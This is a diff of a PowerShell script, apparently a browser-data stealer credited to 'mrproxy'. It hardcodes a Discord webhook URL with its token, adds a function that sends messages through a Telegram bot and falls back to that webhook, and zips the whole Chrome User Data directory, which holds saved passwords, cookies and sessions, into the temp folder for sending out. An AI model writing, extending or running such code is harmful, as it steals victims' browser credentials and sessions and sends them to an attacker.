@@ -1,6 +1,31 @@
+### Created by mrproxy
+
 # $botToken = "bot_token"
 # $chatID = "chat_id"
 $webhook = "https://discord.com/api/webhooks/1358791393405047081/Uz8PRcFd4de_7tDePzmRsTlGKo76zMkjehmo0WvYw-REPkgNXexXGBK2b78RRfOmWU3N"
+
+# Function for sending messages through Telegram Bot
+function Send-TelegramMessage {
+    param (
+        [string]$message
+    )
+
+    if ($botToken -and $chatID) {
+        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
+        $body = @{
+            chat_id = $chatID
+            text = $message
+        }
+
+        try {
+            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
+        } catch {
+            Write-Host "Failed to send message to Telegram: $_"
+        }
+    } else {
+        Send-DiscordMessage -message $message
+    }
+}
 
 # Function for sending messages through Discord Webhook
 function Send-DiscordMessage {
@@ -70,23 +95,24 @@ if (-not (Test-Path $chromePath)) {
     exit
 }
 
-# Log the existence of chrome path
-Write-Host "Chrome path found: $chromePath"
-
 # Create a zip of the Chrome User Data using .NET compression (alternative method)
 $outputZip = "$env:TEMP\chrome_data.zip"
 try {
+    # Create a new zip file
     $zipFile = [System.IO.Compression.ZipFile]::Open($outputZip, [System.IO.Compression.ZipArchiveMode]::Create)
 
-    # Add files from Chrome User Data directory to zip
+    # Recursively add files from Chrome User Data directory to the zip
     Get-ChildItem -Path $chromePath -Recurse | ForEach-Object {
         $file = $_
         if ($file.PSIsContainer) {
-            $zipFile.CreateEntryDirectory($file.FullName.Substring($chromePath.Length + 1)) # Create the directory structure in the zip
+            # If it's a directory, create the directory in the zip
+            $zipFile.CreateEntryDirectory($file.FullName.Substring($chromePath.Length + 1))
         } else {
-            $zipFile.CreateEntryFromFile($file.FullName, $file.FullName.Substring($chromePath.Length + 1)) # Add files to zip
+            # If it's a file, add it to the zip
+            $zipFile.CreateEntryFromFile($file.FullName, $file.FullName.Substring($chromePath.Length + 1))
         }
     }
+
     $zipFile.Dispose()
 
     Write-Host "Compression successful, file saved at: $outputZip"
